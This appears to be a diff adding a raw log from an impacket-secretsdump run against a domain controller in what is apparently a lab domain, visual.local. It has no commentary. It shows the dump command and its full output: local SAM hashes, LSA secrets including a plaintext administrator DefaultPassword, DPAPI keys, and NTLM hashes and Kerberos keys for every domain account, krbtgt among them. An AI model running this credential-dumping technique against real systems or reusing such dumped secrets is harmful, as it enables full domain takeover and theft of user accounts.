@@ -1,0 +1,125 @@
+impacket-secretsdump 'visual.local/roy.ada@192.168.60.76' -dc-ip 192.168.60.76                             
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Target system bootKey: 0x000cdc07c58ec3a71160bb62637f2676
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0f1e872f8e0d47bb0517ecdd497aaec9:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+VISUAL\VISUAL-DC1$:aes256-cts-hmac-sha1-96:07d3c7c725e42c87e274a809b26bc592c9d1e962dcbfa22859638f1e700f7627
+VISUAL\VISUAL-DC1$:aes128-cts-hmac-sha1-96:f3a5b762db5544c3f32120368c052bca
+VISUAL\VISUAL-DC1$:des-cbc-md5:1aab9bcd07314326
+VISUAL\VISUAL-DC1$:plain_password_hex:478eaa2a7ba30b67dbf0e6f4a3b93148cbe1c2e4991fb70ba41e99c7fd3a67e4ee17c508482db07d6c8834154e39551d16ec301bcb65f1e0b4aa6e64509ed4fb833938f8d3ac593554dc5c46a9feb3621424235fd140426c0002c388711527081e06fc34fab7b5286bb7ddb180992e98f18d2753d518f72dac5abc431ce48b20472a543cfa86371836af7beb5a36558ad45c8d2b5d8a44d97060a4401f92032f28bfee868caf123710bfe52a4d6e1b02c160214a6a8c0588ae0edc63b03f7d91c680a941aa9c2e71609bfcade1b9ca89e27900eeb27680b8e72e15e645929fb210d5784d93ca7cf5b8d90f6d689e4071
+VISUAL\VISUAL-DC1$:aad3b435b51404eeaad3b435b51404ee:871e850ed077ff72e909d8b73d396678:::
+[*] DefaultPassword 
+VISUAL\Administrator:Vi9!rp-GOJHaQuMUPrs_0f5JaSwGbkc
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xdd73b29711ee2a7a97bf17b118d34901745956b6
+dpapi_userkey:0x3e2725c50be98c1855a8c298fc021c09465a00c6
+[*] NL$KM 
+ 0000   31 12 F9 B1 19 FA B1 A2  3D 30 F0 C1 56 A6 0D B3   1.......=0..V...
+ 0010   12 F1 A5 58 9A CF 79 A5  92 3A F3 2F C4 75 19 C5   ...X..y..:./.u..
+ 0020   09 E9 8A 39 03 D3 85 9F  FD 5A CF FE C8 23 B0 19   ...9.....Z...#..
+ 0030   A9 40 96 25 07 54 A3 4F  AD 62 93 0B C1 46 C9 BE   .@.%.T.O.b...F..
+NL$KM:3112f9b119fab1a23d30f0c156a60db312f1a5589acf79a5923af32fc47519c509e98a3903d3859ffd5acffec823b019a94096250754a34fad62930bc146c9be
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:21d7259cf630e25fd7fb1d77243076f2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:835ae19265b78c7d85289bd19bb58c95:::
+visual.local\park.ian:1103:aad3b435b51404eeaad3b435b51404ee:45c557ec27ba90e9688f23b66837eca8:::
+visual.local\bell.ivy:1104:aad3b435b51404eeaad3b435b51404ee:e4adb4696d82541361a4a3626f3ad924:::
+visual.local\hunt.jay:1105:aad3b435b51404eeaad3b435b51404ee:8dd67107bf0595605a3bafd01c5b40d0:::
+visual.local\king.nia:1106:aad3b435b51404eeaad3b435b51404ee:14f88e8af18ce9bb67f5c91d6463c72f:::
+visual.local\kim.eli:1107:aad3b435b51404eeaad3b435b51404ee:ed73b81d43ff79aef6b29becc14c788a:::
+visual.local\hill.ava:1108:aad3b435b51404eeaad3b435b51404ee:e8b71d809ef4557f30c4fba6748a9eaf:::
+visual.local\hall.noa:1109:aad3b435b51404eeaad3b435b51404ee:25451b15eeabfa492d9a18442a6e914b:::
+visual.local\ward.eva:1110:aad3b435b51404eeaad3b435b51404ee:1fefe6e5c9717b88aeafdb14c6a9cce8:::
+visual.local\wood.sam:1111:aad3b435b51404eeaad3b435b51404ee:68f39fc703107cb766648d6e0ec60cef:::
+visual.local\shaw.dan:1112:aad3b435b51404eeaad3b435b51404ee:70a00dc375e1bbc3be9fa4e39111780a:::
+visual.local\cook.kai:1113:aad3b435b51404eeaad3b435b51404ee:627a96518ea1b496f0d63689942b4398:::
+visual.local\lee.ben:1114:aad3b435b51404eeaad3b435b51404ee:0ae1c93ec02c90a99b27b7e0217dddca:::
+visual.local\west.zoe:1115:aad3b435b51404eeaad3b435b51404ee:24e822f888bdb64f2ecac4ffd1a337f0:::
+visual.local\ross.max:1116:aad3b435b51404eeaad3b435b51404ee:3f754679dc1d5f6f6e6e43e8287d9d8a:::
+visual.local\cole.tom:1117:aad3b435b51404eeaad3b435b51404ee:67f00208024b97a312aa55e8d6895dc8:::
+visual.local\gray.leo:1118:aad3b435b51404eeaad3b435b51404ee:d1d3708ac5c31a66f259eb8b4f6a1ff1:::
+visual.local\fox.mia:1119:aad3b435b51404eeaad3b435b51404ee:3803b34cb56c41fb2d0a4b9b2eef800a:::
+visual.local\roy.ada:1120:aad3b435b51404eeaad3b435b51404ee:144d8ff9bc19441d7706380325cee0b6:::
+visual.local\reed.amy:1121:aad3b435b51404eeaad3b435b51404ee:e62522c7b2280da53f66e2ff6bb7b27b:::
+visual.local\long.liz:1122:aad3b435b51404eeaad3b435b51404ee:0d544f7cb5f508e7cf95cb41675db171:::
+VISUAL-DC1$:1000:aad3b435b51404eeaad3b435b51404ee:871e850ed077ff72e909d8b73d396678:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:36ce02f31ea21fb6b81e2230f041e67ea1bc76f51b0a56168cc11754c6a54bcd
+Administrator:aes128-cts-hmac-sha1-96:df504a597b34f5aed581e7b1d3b9d61f
+Administrator:des-cbc-md5:9dd398a4794fa27a
+krbtgt:aes256-cts-hmac-sha1-96:d5ba951b7ed6148cb846c61dc4ba57b84736ede78e858800ef0823ea0c2b3b54
+krbtgt:aes128-cts-hmac-sha1-96:d2198c22e58541bb788fbd5064a55ba9
+krbtgt:des-cbc-md5:984f581f0815545b
+visual.local\park.ian:aes256-cts-hmac-sha1-96:fe613457ed4e1c1ed85b07c93ae767cf8c1a0fcffb2e1484f937bd3f4f0c3e9d
+visual.local\park.ian:aes128-cts-hmac-sha1-96:35845980f7c92afa5c165105cf37cbfb
+visual.local\park.ian:des-cbc-md5:15435246e0ef045d
+visual.local\bell.ivy:aes256-cts-hmac-sha1-96:a78a0f85f5bc67373ba6820a3b1d5b5030794e6efcbcbb017d2f86f223985afd
+visual.local\bell.ivy:aes128-cts-hmac-sha1-96:c45960dd096d6a2fed338bc1ec6898bf
+visual.local\bell.ivy:des-cbc-md5:92460b674657c8a8
+visual.local\hunt.jay:aes256-cts-hmac-sha1-96:faf910e62eb0eb6e021dd1c8e79f43dfe7b4ba7bc833355708ecffbcb1c95cc2
+visual.local\hunt.jay:aes128-cts-hmac-sha1-96:7976c2888da0986926a171972ffa38d6
+visual.local\hunt.jay:des-cbc-md5:c24acbad46abe661
+visual.local\king.nia:aes256-cts-hmac-sha1-96:3bce3a50c4a1d611e37b8491c6affdf825c9e42717c1e5000594e9974fe331ef
+visual.local\king.nia:aes128-cts-hmac-sha1-96:77cb96e395bdcc458f46d96fb8f46716
+visual.local\king.nia:des-cbc-md5:c823914acbc7611c
+visual.local\kim.eli:aes256-cts-hmac-sha1-96:9319e762a4f02664ff9aaa45952632846f48e34fff5f66d68cf95a558309879d
+visual.local\kim.eli:aes128-cts-hmac-sha1-96:4fc3180c898576ffa0f72aab43c81a88
+visual.local\kim.eli:des-cbc-md5:c12f4507ec5240a4
+visual.local\hill.ava:aes256-cts-hmac-sha1-96:32509c5c4315019628cf9fc9eccfcd5bc5f82ccedf47275f25330b5b0deb665f
+visual.local\hill.ava:aes128-cts-hmac-sha1-96:c19c0de33c36dfb1fd692509ff26950d
+visual.local\hill.ava:des-cbc-md5:6d62081cb02a8a23
+visual.local\hall.noa:aes256-cts-hmac-sha1-96:6385db6916840df3b001220dc8c58b25556e3259374e1ddd943b0a7d28144566
+visual.local\hall.noa:aes128-cts-hmac-sha1-96:39e401715000c2c1b5df11ad1adf79c7
+visual.local\hall.noa:des-cbc-md5:da9e6731cd43f1a4
+visual.local\ward.eva:aes256-cts-hmac-sha1-96:9c5ab3d90e98a419d72c09d53e70fb2a6051bf9bdc4a19dc8e322306626fbfa8
+visual.local\ward.eva:aes128-cts-hmac-sha1-96:6d26b7da6f81c9ef56dd6c106dbe1733
+visual.local\ward.eva:des-cbc-md5:7ae9573d5d7fc158
+visual.local\wood.sam:aes256-cts-hmac-sha1-96:25b556eb684da8056891f9c90922559c246fe354dbe6731d43c2d8ede0f8c110
+visual.local\wood.sam:aes128-cts-hmac-sha1-96:981713b0fa3fcf5f8e505ff8afe87f17
+visual.local\wood.sam:des-cbc-md5:d3d6b3cecb61681a
+visual.local\shaw.dan:aes256-cts-hmac-sha1-96:b8db034cd39d54260279da151ccaf8451e60c12ba81451aa09cf8821234993e1
+visual.local\shaw.dan:aes128-cts-hmac-sha1-96:0623e57a817de73954faeacad5fd0ce0
+visual.local\shaw.dan:des-cbc-md5:5bcbab4079e0e06b
+visual.local\cook.kai:aes256-cts-hmac-sha1-96:50a1512e7df17dc7a16384893293702e4f5876f8b4677b2967599152a789796d
+visual.local\cook.kai:aes128-cts-hmac-sha1-96:57a31416ce056ca134472509cb21fd52
+visual.local\cook.kai:des-cbc-md5:98072aba6e2620f2
+visual.local\lee.ben:aes256-cts-hmac-sha1-96:dd75015d9db38b7c75a2064ae357c42902b491433df5f0f989809588b5c95244
+visual.local\lee.ben:aes128-cts-hmac-sha1-96:c4c84a4b7180b5444e57a55e59c57870
+visual.local\lee.ben:des-cbc-md5:d613685402911f19
+visual.local\west.zoe:aes256-cts-hmac-sha1-96:877c93a3cd6b1f2a7d6813fe8fcd1414de21ddae8d9a0f584d579ab0f8fb913b
+visual.local\west.zoe:aes128-cts-hmac-sha1-96:70bb0d375d4f8e22892a50ae3c96a4c4
+visual.local\west.zoe:des-cbc-md5:13b06d1fd51f3175
+visual.local\ross.max:aes256-cts-hmac-sha1-96:9877b450d740034ce0358cb9509f4469a822bb65dfe66f153c16e99030b2583e
+visual.local\ross.max:aes128-cts-hmac-sha1-96:219498959619e12e9c9bd39c98020945
+visual.local\ross.max:des-cbc-md5:f897b69b736e6bb5
+visual.local\cole.tom:aes256-cts-hmac-sha1-96:90428f6d7355b7ba4568097a7b9b6a3e29063d12ec41614a9160c207cabea69f
+visual.local\cole.tom:aes128-cts-hmac-sha1-96:7c2f0e2014f4746685142a0ffa201977
+visual.local\cole.tom:des-cbc-md5:267ce63d57896ec7
+visual.local\gray.leo:aes256-cts-hmac-sha1-96:f90f958a49c504141a6390447f06a2122e3fcb41d627a017f3483fa5553d9d38
+visual.local\gray.leo:aes128-cts-hmac-sha1-96:397830848ae95e32db7a27f3682ac68d
+visual.local\gray.leo:des-cbc-md5:16a16b898a942fa7
+visual.local\fox.mia:aes256-cts-hmac-sha1-96:eaf8a93b620b16b15390ac7597afb1c014eda1b7bd6e88501a1822558d24847a
+visual.local\fox.mia:aes128-cts-hmac-sha1-96:be7dbade31ac54b56f79602c32ca5af3
+visual.local\fox.mia:des-cbc-md5:5b7062d3da1fa4e3
+visual.local\roy.ada:aes256-cts-hmac-sha1-96:710fbfba7cc6d5a3b0097e0d3e32aea42e926aa98af0fb9dfac025c2629c32a6
+visual.local\roy.ada:aes128-cts-hmac-sha1-96:b61586644e961725b7631528622782e8
+visual.local\roy.ada:des-cbc-md5:268abf5ba15de91c
+visual.local\reed.amy:aes256-cts-hmac-sha1-96:1a354e48ee03b61b2898014dd7f5175d442fb255c205766cbcc23233fcf1997a
+visual.local\reed.amy:aes128-cts-hmac-sha1-96:a9ba4381e62e7c1af6772dedc4b6889b
+visual.local\reed.amy:des-cbc-md5:3b98da3d0ec4feb0
+visual.local\long.liz:aes256-cts-hmac-sha1-96:e5ec1df82e5af7ec0f66a2781a42a7c08b8e084c92bb84888c781cbf55144383
+visual.local\long.liz:aes128-cts-hmac-sha1-96:0b86fd2bf6fc822dec876d8ad3b79aea
+visual.local\long.liz:des-cbc-md5:642cd551d075ef8f
+VISUAL-DC1$:aes256-cts-hmac-sha1-96:07d3c7c725e42c87e274a809b26bc592c9d1e962dcbfa22859638f1e700f7627
+VISUAL-DC1$:aes128-cts-hmac-sha1-96:f3a5b762db5544c3f32120368c052bca
+VISUAL-DC1$:des-cbc-md5:3bd5920edf20d37a
+[*] Cleaning up... 
